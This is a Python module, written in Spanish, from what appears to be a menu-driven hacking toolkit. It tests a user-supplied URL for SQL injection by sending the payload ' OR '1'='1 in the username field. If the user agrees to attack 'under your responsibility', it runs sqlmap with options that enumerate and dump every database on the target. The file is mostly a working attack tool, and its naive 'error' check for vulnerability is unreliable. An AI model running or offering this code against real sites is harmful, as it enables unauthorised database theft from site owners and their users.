import requests
import urllib.parse
from termcolor import colored
import os

import funcionesbasicas


def comprobarsqlinjection():
    # Define la URL del sitio web y la petición HTTP que deseas enviar

    print(colored("Normalmente te interesara comprobar este tipo de URL http://ip.dominio/mutillidae/index.php?page=login.php ","red"))
    urlsql = input(colored("Escribe la url de la web sobre la que quieras comprobar su estado a SQL Injection: ","yellow"))
    payload = "username=admin&password=pass' OR '1'='1"

    response = requests.get(urlsql)

    # Modifica la petición HTTP para introducir código SQL malicioso
    parsed = urllib.parse.urlparse(urlsql)
    new_query = urllib.parse.parse_qs(parsed.query)
    new_query.update({"username": payload.split("=")[1]})
    new_query.update({"password": ""})
    new_url = parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()
    response = requests.get(new_url)

    # Analiza la respuesta para detectar si hay indicios de inyección SQL
    if "error" in response.text.lower():
        print(colored("La web parece ser vulnerable a inyección SQL","red"))
    else:
        print(colored("La web aparentemente parece NO ser vulnerable a inyección SQL, puede tratarse de un error y que si lo sea","green"))

    atacar = input(colored("Quieres atacar la web? BAJO TU RESPONSABILIDAD: (S/N)", "yellow"))
    if atacar.lower() == "s":

        print(colored("NECESITAS LOS REQUEST HEADERS DE LA CONSULTA, TE DEJO UN TUTORIAL PARA QUE SEPAS COMO HACERLO:","red"))
        print()
        print(colored("https://addons.mozilla.org/es/firefox/addon/http-header-spy/","blue"))
        print()

        print(colored("Guardalo como un fichero llamado request.txt en el directorio raiz del script","red"))


        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }

        with open('headers.txt','w') as f:
            f.write(f"Headers:\n{response}\n\n")

        # Comprobar existencia de la carpeta
        if not os.path.exists("request.txt"):
            print(colored("No se va a ejecutar el ataque, no tienes el fichero en la raiz","red"))
        else:
            print(colored("Con esto ya podemos empezar"))

            comando = f"sqlmap -r \"request.txt\" -p id -dbs --dump"
            print(comando)
            os.system(comando)


            funcionesbasicas.mostrar_intro()
            funcionesbasicas.mostrar_menu()
    else:
        print("De acuerdo, no procederé con el ataque")






